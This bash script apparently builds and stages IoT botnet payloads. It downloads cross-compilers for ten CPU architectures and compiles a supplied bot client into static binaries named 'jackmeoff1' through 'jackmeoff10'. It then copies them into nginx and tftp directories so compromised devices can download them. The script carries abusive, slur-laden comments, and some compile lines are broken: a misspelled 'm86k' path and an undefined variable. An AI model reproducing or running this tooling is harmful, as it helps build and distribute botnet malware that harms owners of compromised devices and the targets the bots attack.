echo -e '\x1b[1;31m'
echo -e '                                                                                \r\n'                                                                   
echo -e '                           ###  #  #     #  #   #  ###      #                   \r\n'
echo -e '                          #     #  #    ##  #  #   #  #    ##                   \r\n'
echo -e '                          #     #  #   # #  # #    #  #   # #                   \r\n'
echo -e '                           #   #####  #  # ###    ####   #  #                   \r\n'
echo -e '                            #  #  #   #### # #    # #    ####                   \r\n'
echo -e '                            #  #  #  #   # #  #   #  #  #   #                   \r\n'
echo -e '                          ###  #  #  #   # #   #  #   # #   #                   \r\n'
echo -e '                                                                                \r\n'
echo -e '                              ~[        ShAy        ]~                          \r\n'
echo -e '\x1b[31m'

#################
#~ MISC ~       #
#################
echo -e "\e[0;31mMade by the one and only XORA/ShAy, made on 2/12/2016"
echo -e "\e[0;31mLNO LIGHT THE RIPPER, YOU CAN'T CODE SHIT"
echo -e "\e[0;31mMade for Debian assuming if you have this, you know that you should use Nginx instead of Apache"
echo -e "\e[0;31mDon't forget about the config for Nginx fuckboy"
sleep 5

##################
#~ BOTNAMES ~    #
##################
LEGAL1='jackmeoff1' #mipsel
LEGAL2='jackmeoff2'  #mips
LEGAL3='jackmeoff3'    #sh4
LEGAL4='jackmeoff4' #x86_64
LEGAL5='jackmeoff5' #armv6l
LEGAL6='jackmeoff6'   #i686
LEGAL7='jackmeoff7'  #powerpc
LEGAL8='jackmeoff8'  #i586
LEGAL9='jackmeoff9'  #m68k
LEGAL10='jackmeoff10'  #sparc

#################
#~ MISC&WGET ~  #
#################
mips='http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2'
mipsel='http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mipsel.tar.bz2'
sh4='http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sh4.tar.bz2'
x86_64='http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-x86_64.tar.bz2'
armv6l='http://distro.ibiblio.org/slitaz/sources/packages/c/cross-compiler-armv6l.tar.bz2'
i686='http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i686.tar.bz2'
ppc='http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc.tar.bz2'
i586='http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i586.tar.bz2'
m68k='http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-m68k.tar.bz2'
sparc='http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sparc.tar.bz2'
echo -e "Usage: Execute just like NSA.sh"
sleep 5
echo -e "\e[0;31myou have 5 seconds to cancel this if you fucked up"
apt-get install tar -q
apt-get install bzip -y || apt-get install bzip2 -y
mkdir /var/www/html; mkdir /var/www/
echo -e "\e[0;31mHERE WE GO AGAIN"
if [ -d cross-compiler-mips ]
then
echo -e "\e[0;31mcross-compiler-mips is present, no need for wget"
else
wget --quiet $mips --no-check-certificate
tar -xvjf cross-compiler-mips*
fi
if [ -d cross-compiler-mipsel ]
then
echo -e "\e[0;31mcross-compiler-mipsel is present, no need for wget"
else
wget --quiet $mipsel --no-check-certificate
tar -xvjf cross-compiler-mipsel*
fi
if [ -d cross-compiler-sh4 ]
then
echo -e "\e[0;31mcross-compiler-sh4 is present, no need for wget"
else
wget --quiet $sh4 --no-check-certificate
tar -xvjf cross-compiler-sh4*
fi
if [ -d cross-compiler-x86_64 ]
then
echo -e "\e[0;31mcross-compiler-x86_64 is present, no need for wget"
else
wget --quiet $x86_64 --no-check-certificate
tar -xvjf cross-compiler-x86_64*
fi
if [ -d cross-compiler-armv6l ]
then
echo -e "\e[0;31mcross-compiler-armv6l is present, no need for wget"
else
wget --quiet $armv6l --no-check-certificate
tar -xvjf cross-compiler-armv6l*
fi
if [ -d cross-compiler-powerpc ]
then
echo -e "\e[0;31mcross-compiler-powerpc is present, no need for wget"
else
wget --quiet $ppc --no-check-certificate
tar -xvjf cross-compiler-powerpc*
fi
if [ -d cross-compiler-m68k ]
then
echo -e "\e[0;31mcross-compiler-m68k is present, no need for wget"
else
wget --quiet $m68k --no-check-certificate 
tar -xvjf cross-compiler-m68k*
fi
if [ -d cross-compiler-sparc ]
then
echo -e "\e[0;31mcross-compiler-sparc is present, no need for wget"
else
wget --quiet $sparc --no-check-certificate
tar -xvjf cross-compiler-sparc*
fi
if [ -d cross-compiler-i586 ]
then
echo -e "\e[0;31mcross-compiler-i586 is present, no need for wget"
else
wget --quiet $i586 --no-check-certificate
tar -xvjf cross-compiler-i586*
fi
if [ -d cross-compiler-i686 ]
then
echo -e "\e[0;31mcross-compiler-i686 is present, no need for wget"
else
wget --quiet $i686 --no-check-certificate
tar -xvjf cross-compiler-i686*
fi
rm -rf *.tar.bz2
echo -e "\e[0;31mDone."
sleep 3
#################
#~ GAY ~        #
#################
./cross-compiler-mipsel/bin/mipsel-gcc -static -lpthread -pthread -DMIPSEL -o $LEGAL1 $1 > /dev/null 2>&1
./cross-compiler-mips/bin/mips-gcc -static -lpthread -pthread -Dmips -o $LEGAL2 $1 > /dev/null 2>&1
./cross-compiler-sh4/bin/sh4-gcc -static -lpthread -pthread -Dsh4 -o $LEGAL3 $1 > /dev/null 2>&1
./cross-compiler-x86_64/bin/x86_64-gcc -static -lpthread -pthread -Dx86_64 -o $LEGAL4 $1 > /dev/null 2>&1
./cross-compiler-armv6l/bin/armv6l-gcc -static -lpthread -pthread -Darmv6l -o $LEGAL5 $1 > /dev/null 2>&1
./cross-compiler-i686/bin/i686-gcc -static -lpthread -pthread -Di686 -o $LEGAL6 $1 > /dev/null 2>&1
./cross-compiler-powerpc/bin/powerpc-gcc -static -lpthread -pthread -Dpowerpc -o $LEGAL7 $1 > /dev/null 2>&1
./cross-compiler-i586/bin/i586-gcc -static -lpthread -pthread -Di586 -o $LEGAL9 $1 > /dev/null 2>&1
./cross-compiler-m86k/bin/m86k-gcc -static -lpthread -pthread -Dm86k -o $LEGAL10 $1 > /dev/null 2>&1
./cross-compiler-sparc/bin/sparc-gcc -static -lpthread -pthread -Dsparc -o $LEGAL11 $1 > /dev/null 2>&1
echo "\e[0;31mDone STOP FUCKING UP"
mv jackm* /var/www/html/

#################
#~ STH ~        #
#################
echo "\e[0;31mWOW let's fix your FUCKUP"
apt-get install nginx; apt-get install php5; service apache2 stop; service nginx start

################
#~ PUSSY ~     #
################
echo -e "\e[0;31mShakra.sh is not a replacement for RIU, this is to only be used when you fucked up / compiled a broken client, and need to get rid of the old shit and replace with the new shit"
echo -e "\e[0;31mBy this point you should have your sh file already / ready in your /var/www/html to be copied over to nginx / tftp, IF NOT YOU DONE FUCKED UP"
cd /usr/share/nginx/www/; rm -rf jackm*; cd /srv/tftp; rm -rf jackm*
cp /var/www/html/* /usr/share/nginx/www; cp /var/www/html/* /srv/tftp
